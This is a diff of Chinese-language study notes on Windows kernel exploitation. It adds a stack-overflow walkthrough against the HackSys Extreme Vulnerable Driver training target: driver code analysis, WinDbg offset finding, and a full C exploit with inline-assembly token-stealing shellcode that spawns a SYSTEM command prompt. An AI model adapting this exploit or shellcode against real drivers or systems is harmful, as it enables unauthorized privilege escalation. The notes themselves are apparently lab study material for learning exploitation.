@@ -1,4 +1,4 @@
-# UAF漏洞
+# UAF漏洞（未开启NX）
 
 ## 提权示例
 
@@ -1197,6 +1197,285 @@ int main() {
 }
 
 ```
+
+# 内核栈溢出
+
+## 漏洞驱动代码分析
+
+### BufferOverflowStack.h
+
+补一个小tip
+
+>`_In_`和`_Out_`宏是空宏，并不参与编译和计算，但它对程序员起到了一个提示的作用，让我们知道如何去使用它。
+>
+>`_In`的实际意义是告诉你，这个变量或参数是输入值，即你必须给这个变量填写好以后提交给某个函数去执行。
+>
+>`_Out_`告诉你，这个变量或参数是输出值，即你不需要预先给它值，当函数执行完毕以后可以从这个变量获取输出的值。
+
+主要做的就是定义了一个函数：
+
+```c++
+NTSTATUS
+TriggerBufferOverflowStack(
+    _In_ PVOID UserBuffer,
+    _In_ SIZE_T Size
+);
+```
+
+### BufferOverflowStack.c
+
+handler如下，将传入的buffer和长度作为参数传给漏洞函数`TriggerBufferOverflowStack`。
+
+```c++
+/// <summary>
+/// Buffer Overflow Stack Ioctl Handler
+/// </summary>
+/// <param name="Irp">The pointer to IRP</param>
+/// <param name="IrpSp">The pointer to IO_STACK_LOCATION structure</param>
+/// <returns>NTSTATUS</returns>
+NTSTATUS
+BufferOverflowStackIoctlHandler(
+    _In_ PIRP Irp,
+    _In_ PIO_STACK_LOCATION IrpSp
+)
+{
+    SIZE_T Size = 0;
+    PVOID UserBuffer = NULL;
+    NTSTATUS Status = STATUS_UNSUCCESSFUL;
+
+    UNREFERENCED_PARAMETER(Irp);
+    PAGED_CODE();
+
+    UserBuffer = IrpSp->Parameters.DeviceIoControl.Type3InputBuffer;
+    Size = IrpSp->Parameters.DeviceIoControl.InputBufferLength;
+
+    if (UserBuffer)
+    {
+        Status = TriggerBufferOverflowStack(UserBuffer, Size);
+    }
+
+    return Status;
+}
+```
+
+在`TriggerBufferOverflowStack`的函数题前面有相应的注解:
+
+```
+__declspec(safebuffers);
+```
+
+查询微软官方文档：
+
+>The **/GS** compiler option causes the compiler to test for buffer overruns by inserting security checks on the stack. The types of data structures that are eligible for security checks are described in [/GS (Buffer Security Check)](https://docs.microsoft.com/zh-cn/cpp/build/reference/gs-buffer-security-check?view=vs-2019). For more information about buffer overrun detection, see [Security Features in MSVC](https://blogs.msdn.microsoft.com/vcblog/2017/06/28/security-features-in-microsoft-visual-c/).
+>
+>An expert manual code review or external analysis might determine that a function is safe from a buffer overrun. In that case, you can suppress security checks for a function by applying the **__declspec(safebuffers)** keyword to the function declaration.
+
+这个关键字可以告知编译器不要插入针对此函数的GS检查。
+
+`KernelBuffer`的定义如下，512个ULONG，而x86中一个ULONG是4个字节，所以缓冲区为0x800个字节大小。
+
+```c++
+#define BUFFER_SIZE 512
+ULONG KernelBuffer[BUFFER_SIZE] = { 0 };
+```
+
+缓冲区的长度为512，但拷贝的时候没有检查，直接拷贝，可能溢出kernel缓冲区。
+
+```c++
+ 		ProbeForRead(UserBuffer, sizeof(KernelBuffer), (ULONG)__alignof(UCHAR));
+
+        DbgPrint("[+] UserBuffer: 0x%p\n", UserBuffer);
+        DbgPrint("[+] UserBuffer Size: 0x%X\n", Size);
+        DbgPrint("[+] KernelBuffer: 0x%p\n", &KernelBuffer);
+        DbgPrint("[+] KernelBuffer Size: 0x%X\n", sizeof(KernelBuffer));
+
+#else
+        DbgPrint("[+] Triggering Buffer Overflow in Stack\n");
+
+        //
+        // Vulnerability Note: This is a vanilla Stack based Overflow vulnerability
+        // because the developer is passing the user supplied size directly to
+        // RtlCopyMemory()/memcpy() without validating if the size is greater or
+        // equal to the size of KernelBuffer
+        //
+
+        RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);
+#endif
+```
+
+## 利用思路
+
+栈溢出的利用，基于我们在Linux环境下的经验，主要就是基于不同的防护机制采用不同的绕过方法。由于我们这次练习使用的是Win7 x86环境，没有开启SMEP，而又没开启GS（canary），所以直接`return to user mode's shellcode`即可！
+
+主要的难点就是确定栈帧中存储的返回地址离我们可控制的缓冲区的偏移。我们先逆向看一下，确定下断点的位置。
+
+漏洞函数的f5代码如下：
+
+```c
+int __stdcall TriggerBufferOverflowStack(void *UserBuffer, unsigned int Size)
+{
+  unsigned int KernelBuffer[512]; // [esp+10h] [ebp-828h]
+  int v4; // [esp+814h] [ebp-24h]
+  BOOL v5; // [esp+818h] [ebp-20h]
+  int Status; // [esp+81Ch] [ebp-1Ch]
+  CPPEH_RECORD ms_exc; // [esp+820h] [ebp-18h]
+
+  Status = 0;
+  KernelBuffer[0] = 0;
+  memset(&KernelBuffer[1], 0, 0x7FCu);
+  v5 = (signed int)(unsigned __int8)KeGetCurrentIrql() > 1;
+  if ( v5 )
+    NT_ASSERT("KeGetCurrentIrql() <= 1");
+  v4 = 1;
+  ms_exc.registration.TryLevel = 0;
+  ProbeForRead(UserBuffer, 0x800u, 1u);
+  _DbgPrintEx(0x4Du, 3u, "[+] UserBuffer: 0x%p\n", UserBuffer);
+  _DbgPrintEx(0x4Du, 3u, "[+] UserBuffer Size: 0x%X\n", Size);
+  _DbgPrintEx(0x4Du, 3u, "[+] KernelBuffer: 0x%p\n", KernelBuffer);
+  _DbgPrintEx(0x4Du, 3u, "[+] KernelBuffer Size: 0x%X\n", 2048);
+  _DbgPrintEx(0x4Du, 3u, "[+] Triggering Buffer Overflow in Stack\n");
+  memcpy(KernelBuffer, UserBuffer, Size);
+  return Status;
+}
+```
+
+我们直接将断点下到`TriggerBufferOverflowStack`即可。
+
+```
+2: kd> bp HEVD!TriggerBufferOverflowStack
+2: kd> bl
+     0 e Disable Clear  a5edd6b0     0001 (0001) HEVD!TriggerBufferOverflowStack
+```
+
+然后continue，断到断点处
+
+```
+1: kd> kp
+ # ChildEBP RetAddr  
+00 916f3ab0 a5edd696 HEVD!TriggerBufferOverflowStack(void * UserBuffer = 0x0016f334, unsigned long Size = 0x800)+0x119 
+01 916f3ad4 a5eddeac HEVD!BufferOverflowStackIoctlHandler(struct _IRP * Irp = 0x88bab550, struct _IO_STACK_LOCATION * IrpSp = 0x88bab5c0 IRP_MJ_DEVICE_CONTROL / 0x0 for {...})+0x76
+02 916f3afc 83e78593 HEVD!IrpDeviceIoCtlHandler(struct _DEVICE_OBJECT * DeviceObject = 0x86ad3f08 Device for "\Driver\HEVD", struct _IRP * Irp = 0x88bab550)+0xbc 
+03 916f3b14 8406c99f nt!IofCallDriver+0x63
+04 916f3b34 8406fb71 nt!IopSynchronousServiceTail+0x1f8
+05 916f3bd0 840b63f4 nt!IopXxxControlFile+0x6aa
+06 916f3c04 83e7f1ea nt!NtDeviceIoControlFile+0x2a
+07 916f3c04 774670b4 nt!KiFastCallEntry+0x12a
+08 0016f274 77465864 ntdll!KiFastSystemCallRet
+09 0016f278 7582989d ntdll!ZwDeviceIoControlFile+0xc
+0a 0016f2d8 772ba671 KernelBase!DeviceIoControl+0xf6
+0b 0016f304 013a10ce kernel32!DeviceIoControlImplementation+0x80
+WARNING: Frame IP not in any known module. Following frames may be wrong.
+0c 0016fb38 013a12a7 0x13a10ce
+0d 0016fb80 772c3c45 0x13a12a7
+0e 0016fb8c 774837f5 kernel32!BaseThreadInitThunk+0xe
+0f 0016fbcc 774837c8 ntdll!__RtlUserThreadStart+0x70
+10 0016fbe4 00000000 ntdll!_RtlUserThreadStart+0x1b
+
+```
+
+从缓冲区开始我们查找相应的地址，所以偏移为0x830
+
+```
+1: kd> dd KernelBuffer+0x800
+916f3a88  00000000 00000001 00000000 00000而
+916f3a98  916f3278 00000302 916f3bc0 a5e990d0
+916f3aa8  4e66d44e 00000000 916f3ad4 a5edd696 // 返回地址
+916f3ab8  0016f334 00000800 00000001 c0000001
+916f3ac8  00000800 00000000 0016f334 916f3afc
+916f3ad8  a5eddeac 88bab550 88bab5c0 00000001
+916f3ae8  00000000 00222003 00000000 c00000bb
+916f3af8  88bab5c0 916f3b14 83e78593 86ad3f08
+
+
+```
+
+但我们的shellcode将`HEVD!TriggerBufferOverflowStack`的返回地址覆盖为提权函数地址，saved_ebp相应被覆盖为`aaaa`。所以在`HEVD!TriggerBufferOverflowStack`返回后会执行shellcode，而此时ebp被破坏。而在shellcode结束的时候我们应该正常返回到`HEVD!IrpDeviceIoCtlHandler`，所以我们手动平衡堆栈即可（移动堆栈，修改ebp为0x916f3afc，再ret时候再平衡即可）。
+
+## 完成exp
+
+```c++
+#include<stdio.h>
+#include<windows.h>
+
+#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
+
+#define HEVD_IOCTL_BUFFER_OVERFLOW_STACK                         IOCTL(0x800)
+#define HEVD_IOCTL_BUFFER_OVERFLOW_STACK_GS                      IOCTL(0x801)
+
+typedef void(*FunctionPointer)(void);
+
+void Shellcode()
+{
+	//__debugbreak();
+	_asm
+	{
+		nop
+		pushad
+		mov eax, fs:[124h]		
+		mov eax, [eax + 0x50] 	
+		mov ecx, eax 			
+		mov edx, 4
+
+		find_sys_pid :
+					 mov eax, [eax + 0xb8]		
+					 sub eax, 0xb8			
+					 cmp[eax + 0xb4], edx	
+					 jnz find_sys_pid
+
+					 mov edx, [eax + 0xf8]
+					 mov[ecx + 0xf8], edx
+					 popad
+					 add esp, 0x20
+					 pop ebp
+					 ret 8
+	}
+}
+
+static VOID CreateCmd()
+{
+	STARTUPINFO si = { sizeof(si) };
+	PROCESS_INFORMATION pi = { 0 };
+	si.dwFlags = STARTF_USESHOWWINDOW;
+	si.wShowWindow = SW_SHOW;
+	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
+	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
+	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
+}
+
+int main() {
+	HANDLE hDevice = INVALID_HANDLE_VALUE;  // handle to the drive to be examined
+	hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
+		GENERIC_READ | GENERIC_WRITE,
+		NULL,
+		NULL,
+		OPEN_EXISTING,
+		NULL,
+		NULL);
+
+	if (hDevice == INVALID_HANDLE_VALUE) {
+		printf("cannot open i/o device");
+		return false;
+	}
+	DWORD recvBuf;
+	CHAR shellcode[0x830];
+	RtlFillMemory((PVOID)shellcode, sizeof(shellcode)-0x4, 0x41);
+	*(PDWORD)(shellcode + 0x82c) = (DWORD)&Shellcode;
+	// allocate memory in non_paged pool
+	DeviceIoControl(hDevice,                       // device to be queried
+		HEVD_IOCTL_BUFFER_OVERFLOW_STACK, // operation to perform
+		shellcode, sizeof(shellcode),              
+		NULL, 0,
+		&recvBuf,                         // # bytes returned
+		NULL);          // synchronous I/O
+	
+	CreateCmd();
+	return 0;
+}
+```
+
+
+
+
 
 
 
